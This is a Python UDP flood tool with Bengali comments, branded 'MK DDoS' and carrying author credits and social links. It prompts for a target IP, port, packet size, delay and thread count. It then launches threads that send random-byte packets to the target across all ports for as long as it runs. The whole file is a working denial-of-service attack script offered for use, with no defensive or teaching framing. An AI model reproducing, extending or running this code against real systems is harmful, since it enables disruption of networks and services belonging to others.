import os
import time
import socket
import random
import threading

# র‍্যান্ডম কালার লিস্ট
colors = ["\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[95m", "\033[96m"]

# ASCII ব্যানার (figlet ছাড়া)
ascii_banner = r"""
.-----------------------------------------------------------------.
| /$$      /$$/$$             /$$$$$$$ /$$$$$$$           /$$$$$$ |
|| $$$    /$$| $$            | $$__  $| $$__  $$         /$$__  $$|
|| $$$$  /$$$| $$   /$$      | $$  \ $| $$  \ $$ /$$$$$$| $$  \__/|
|| $$ $$/$$ $| $$  /$$/      | $$  | $| $$  | $$/$$__  $|  $$$$$$ |
|| $$  $$$| $| $$$$$$/       | $$  | $| $$  | $| $$  \ $$\____  $$|
|| $$\  $ | $| $$_  $$       | $$  | $| $$  | $| $$  | $$/$$  \ $$|
|| $$ \/  | $| $$ \  $$      | $$$$$$$| $$$$$$$|  $$$$$$|  $$$$$$/|
||__/     |__|__/  \__/      |_______/|_______/ \______/ \______/ |
'-----------------------------------------------------------------'
"""

# ব্যানার দেখানোর ফাংশন
def show_banner(text):
    os.system("clear")
    for line in text.splitlines():
        color = random.choice(colors)
        print(color + line)
        time.sleep(0.1)
    print("\033[0m")  # reset

# ইনফো এনিমেটেডভাবে দেখানোর ফাংশন
def show_info(info_lines):
    for line in info_lines:
        color = random.choice(colors)
        print(color + line)
        time.sleep(0.2)
    print("\033[0m")

# ইনপুট নেওয়া
show_banner(ascii_banner)
info = [
    "Coded By : Mr.Mk-777",
    "Author   : Mkmuslim777",
    "Github   : github.com/Mkmuslim777",
    "FB       : facebook.com/MuslimUddinMk",
    "Telegram : t.me/MK777team"
]
show_info(info)

# ইনপুট
ip = input("IP Target           : ")
port = int(input("Starting Port       : "))
packet_size = int(input("Packet Size (bytes) : "))
delay = float(input("Delay (seconds)     : "))
threads = int(input("Number of Threads   : "))

# Packet data
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes_ = random._urandom(packet_size)
sent = 0
start_time = time.time()
lock = threading.Lock()

# প্যাকেট পাঠানোর ফাংশন
def send_packets():
    global sent, port
    while True:
        sock.sendto(bytes_, (ip, port))
        with lock:
            sent += 1
            port += 1
            if port >= 65534:
                port = 1
            current_time = time.strftime("%H:%M:%S")
            print(f"\033[96m[{current_time}] Sent {sent} packet to {ip} through port: {port}")
        time.sleep(delay)

# আক্রমণ শুরু ব্যানার
attack_banner = r"""
.-----------------------------------------------------------------.
| /$$      /$$/$$             /$$$$$$$ /$$$$$$$           /$$$$$$ |
|| $$$    /$$| $$            | $$__  $| $$__  $$         /$$__  $$|
|| $$$$  /$$$| $$   /$$      | $$  \ $| $$  \ $$ /$$$$$$| $$  \__/|
|| $$ $$/$$ $| $$  /$$/      | $$  | $| $$  | $$/$$__  $|  $$$$$$ |
|| $$  $$$| $| $$$$$$/       | $$  | $| $$  | $| $$  \ $$\____  $$|
|| $$\  $ | $| $$_  $$       | $$  | $| $$  | $| $$  | $$/$$  \ $$|
|| $$ \/  | $| $$ \  $$      | $$$$$$$| $$$$$$$|  $$$$$$|  $$$$$$/|
||__/     |__|__/  \__/      |_______/|_______/ \______/ \______/ |
'-----------------------------------------------------------------'
"""
show_banner(attack_banner)
print(random.choice(colors) + "Attack is starting...\n")

# একাধিক থ্রেড চালু করা
for _ in range(threads):
    thread = threading.Thread(target=send_packets)
    thread.daemon = True
    thread.start()

# প্রোগ্রাম চালু রাখার জন্য
while True:
    time.sleep(1)
